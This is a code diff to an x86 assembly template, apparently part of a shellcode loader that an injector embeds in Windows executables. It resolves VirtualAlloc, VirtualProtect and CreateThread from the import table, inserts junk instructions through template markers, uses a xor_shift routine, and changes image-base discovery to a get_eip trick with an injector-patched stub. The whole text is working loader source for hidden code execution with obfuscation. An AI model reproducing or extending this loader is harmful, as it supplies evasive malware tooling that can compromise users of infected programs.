@@ -10,6 +10,7 @@
 // [esp+0x10] store address of VirtualProtect
 // [esp+0x14] store address of CreateThread
 // [esp+0x18] store address of WaitForSingleObject
+// 0x21082520 is a stub that will be replaced by injector
 
 entry:
 // ================================ prepare environment ================================
@@ -59,12 +60,10 @@ entry:
     push {{.Reg.eax}}                                          {{igi}}
   {{end}}
 
-  // get pointer to the PEB
-  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{igi}}
-  mov {{.Reg.eax}}, 0x30                                       {{igi}}
-  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{igi}}
-  // store image base address
-  mov {{.RegN.edi}}, [{{.Reg.ebx}} + 0x08]                     {{igi}}
+  // calculate image base address
+  call get_eip
+  mov {{.RegN.edi}}, {{.Reg.eax}}
+  sub {{.RegN.edi}}, 0x21082520
 
   // read the LoadLibraryA/W form IAT
   mov {{.RegN.ebx}}, {{.RegN.edi}}                             {{igi}}
@@ -262,12 +261,10 @@ entry:
   {{end}}
 
 {{else}}
-  // get pointer to the PEB
-  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{igi}}
-  mov {{.Reg.eax}}, 0x30                                       {{igi}}
-  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{igi}}
-  // store image base address
-  mov {{.RegN.edi}}, [{{.Reg.ebx}} + 0x08]                     {{igi}}
+  // calculate image base address
+  call get_eip
+  mov {{.RegN.edi}}, {{.Reg.eax}}
+  sub {{.RegN.edi}}, 0x21082520
   // get procedure address of VirtualAlloc
   mov {{.RegV.eax}}, {{.RegN.edi}}                             {{igi}}
   add {{.RegV.eax}}, {{hex .VirtualAlloc}}                     {{igi}}
@@ -502,6 +499,11 @@ entry:
   {{db .EndOfLoader}}
 
 // ====================================== function =======================================
+
+get_eip:
+  pop  {{.Reg.eax}}                                            {{igi}}
+  push {{.Reg.eax}}                                            {{igi}}
+  ret                                                          {{igi}}
 
 xor_shift:
   push {{.RegV.ecx}}                                           {{igi}}
